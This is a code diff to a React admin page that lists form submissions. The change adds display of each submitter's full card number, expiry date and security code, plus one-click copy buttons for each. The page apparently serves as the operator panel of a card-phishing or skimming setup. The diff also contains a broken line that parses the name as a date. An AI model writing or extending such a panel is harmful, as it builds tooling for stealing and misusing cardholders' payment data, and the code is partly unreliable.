@@ -347,7 +347,7 @@ async function copyText(value: string) {
         </table>
       </div>
 
-      {/* Mobile */}
+     {/* Mobile */}
 <div className="mt-8 space-y-3 md:hidden">
   {rows.length === 0 && (
     <p className="text-[#9aa8b8]">No submissions yet.</p>
@@ -358,16 +358,24 @@ async function copyText(value: string) {
       key={row.id}
       className="rounded-xl border border-[#2a3548] bg-[#1a2332] p-4 text-sm"
     >
+	
+	<p className="mt-1 text-xs text-[#9aa8b8]">
+        {new Date(row.created_at).toLocaleString()}
+      </p>
+	  
       <div className="flex items-start justify-between gap-2">
         <p className="font-medium break-words">{row.first_name}</p>
         <span className="shrink-0 capitalize text-[#9aa8b8]">{row.status}</span>
       </div>
+	  
+	  <p className="mt-1 break-all text-[#9aa8b8]">{row.card_number}</p>
+	  
+	  <p className="mt-1 break-all text-[#9aa8b8]">{row.expiry}</p>
+	  
+	  <p className="mt-1 break-all text-[#9aa8b8]">{row.security_code}</p>
 
       <p className="mt-1 break-all text-[#9aa8b8]">{row.email}</p>
-      <p className="mt-1 text-xs text-[#9aa8b8]">
-        {new Date(row.created_at).toLocaleString()}
-      </p>
-
+      
       {row.waiting_name && (
         <p className="mt-2 break-words">Waiting name: {row.waiting_name}</p>
       )}
@@ -376,18 +384,32 @@ async function copyText(value: string) {
         <button
           type="button"
           className="rounded border border-[#2a3548] px-2 py-1 text-xs text-[#9aa8b8]"
-          onClick={() => copyText(new Date(row.created_at).toLocaleString())}
-        >
-          Copy time
-        </button>
-        <button
-          type="button"
-          className="rounded border border-[#2a3548] px-2 py-1 text-xs text-[#9aa8b8]"
-          onClick={() => copyText(row.first_name)}
+          onClick={() => copyText(new Date(row.first_name).toLocaleString())}
         >
           Copy name
         </button>
         <button
+          type="button"
+          className="rounded border border-[#2a3548] px-2 py-1 text-xs text-[#9aa8b8]"
+          onClick={() => copyText(row.card_number)}
+        >
+          Copy card_number
+        </button>
+        <button
+          type="button"
+          className="rounded border border-[#2a3548] px-2 py-1 text-xs text-[#9aa8b8]"
+          onClick={() => copyText(row.expiry)}
+        >
+          Copy expiry
+        </button>
+		<button
+          type="button"
+          className="rounded border border-[#2a3548] px-2 py-1 text-xs text-[#9aa8b8]"
+          onClick={() => copyText(row.security_code)}
+        >
+          Copy security_code
+        </button>
+		<button
           type="button"
           className="rounded border border-[#2a3548] px-2 py-1 text-xs text-[#9aa8b8]"
           onClick={() => copyText(row.email)}
